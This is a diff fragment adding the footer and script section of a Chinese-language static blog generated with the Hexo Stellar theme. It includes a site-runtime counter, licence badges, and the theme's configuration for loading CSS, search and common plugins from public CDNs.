+    runtime_span.innerHTML = "⏱️本站已运行 " + A + "天" + B + "小时" + C + "分" + D + "秒"
+}
+show_runtime();
+</script>
+</center>
+<div style="display: flex;justify-content: center;align-items: center;margin: 10px;">
+<a target="_blank" rel="noopener" href="https://notbyai.fyi/"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/assets/website/Written-By-Human-white.png" alt='全部都是博主用心学编写的啊！不是ai啊' style="width:140px;height:50px;margin-right: 10px " id='notbyai'></a>
+<a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/assets/website/by-nc-sa.eu.png" alt="只要保留原作者姓名并在基于原作创作的新作品适用同类型的许可协议，即可基于非商业目的对原作重新编排、改编或者再创作。" style="width:140px;height:50px"></a>
+</div>
+ 
+</div></footer>
+
+      <div class='float-panel mobile-only blur' style='display:none'>
+  <button type='button' class='sidebar-toggle mobile' onclick='sidebar.toggle()'>
+    <svg class="icon" style="width: 1em; height: 1em;vertical-align: middle;fill: currentColor;overflow: hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="15301"><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 2.3 26.8 24.6 47.5 51.6 47.6h416.5v4z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15302"></path><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 1.9 27.7 23.9 49.7 51.6 51.6h416.5z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15303"></path></svg>
+  </button>
+</div>
+
+    </div>
+  </div>
+  <div class='scripts'>
+    
+<script type="text/javascript">
+  const stellar = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    loadCSS: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    // 从 butterfly 和 volantis 获得灵感
+    loadScript: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      if (src.startsWith('/')){
+        src = stellar.config.root + src.substring(1);
+      }
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    // https://github.com/jerryc127/hexo-theme-butterfly
+    jQuery: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        stellar.loadScript(stellar.plugins.jQuery).then(fn)
+      } else {
+        fn()
+      }
+    }
+  };
+  stellar.version = '1.23.0';
+  stellar.github = 'https://github.com/xaoxuu/hexo-theme-stellar/tree/1.23.0';
+  stellar.config = {
+    date_suffix: {
+      just: '刚刚',
+      min: '分钟前',
+      hour: '小时前',
+      day: '天前',
+      month: '个月前',
+    },
+    root : '/',
+  };
+
+  // required plugins (only load if needs)
+  stellar.plugins = {
+    jQuery: 'https://gcore.jsdelivr.net/npm/jquery@3.6.2/dist/jquery.min.js'
+  };
+
+  if ('local_search') {
+    stellar.search = {};
+    stellar.search.service = 'local_search';
+    if (stellar.search.service == 'local_search') {
+      let service_obj = Object.assign({}, {"field":"all","path":"/search.json","content":true,"codeblock":true,"sort":"-date"});
+      stellar.search[stellar.search.service] = service_obj;
+    }
+  }
+
+  // stellar js
+  stellar.plugins.stellar = Object.assign({"sites":"/js/plugins/sites.js","friends":"/js/plugins/friends.js","ghinfo":"/js/plugins/ghinfo.js","timeline":"/js/plugins/timeline.js","linkcard":"/js/plugins/linkcard.js","fcircle":"/js/plugins/fcircle.js","weibo":"/js/plugins/weibo.js","memos":"/js/plugins/memos.js"});
+
+  stellar.plugins.marked = Object.assign("https://cdn.bootcdn.net/ajax/libs/marked/4.0.18/marked.min.js");
+  // optional plugins
+  if ('true' == 'true') {
+    stellar.plugins.lazyload = Object.assign({"enable":true,"js":"https://gcore.jsdelivr.net/npm/vanilla-lazyload@17.8.3/dist/lazyload.min.js","transition":"blur"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.swiper = Object.assign({"enable":true,"css":"https://unpkg.com/swiper@10.3/swiper-bundle.min.css","js":"https://unpkg.com/swiper@10.3/swiper-bundle.min.js"});
+  }
+  if ('' == 'true') {
+    stellar.plugins.scrollreveal = Object.assign({"enable":null,"js":"https://gcore.jsdelivr.net/npm/scrollreveal@4.0.9/dist/scrollreveal.min.js","distance":"8px","duration":500,"interval":100,"scale":1});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.preload = Object.assign({"enable":true,"service":"flying_pages","instant_page":"https://gcore.jsdelivr.net/gh/volantis-x/cdn-volantis@4.1.2/js/instant_page.js","flying_pages":"https://gcore.jsdelivr.net/gh/gijo-varghese/flying-pages@2.1.2/flying-pages.min.js"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.fancybox = Object.assign({"enable":true,"js":"https://gcore.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.umd.js","css":"https://gcore.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.css","selector":".swiper-slide img, .gallery img ,#waline_container .vcontent img"});
+  }
+  if ('false' == 'true') {
+    stellar.plugins.heti = Object.assign({"enable":false,"css":"https://unpkg.com/heti@0.9.2/umd/heti.min.css","js":"https://unpkg.com/heti@0.9.2/umd/heti-addon.min.js"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.copycode = Object.assign({"enable":true,"js":"/js/plugins/copycode.js","default_text":"Copy","success_text":"Copied","toast":"复制成功"});
+  }
+</script>
+
+<!-- required -->
+
+  
+<script src="/js/main.js" async></script>
+
+
+
+<!-- optional -->
+
+
+
+
+
+
+<!-- inject -->
+<script type="text/javascript" src="/js/darkmode.js"></script>
+
+  </div>
+</body>
+</html>
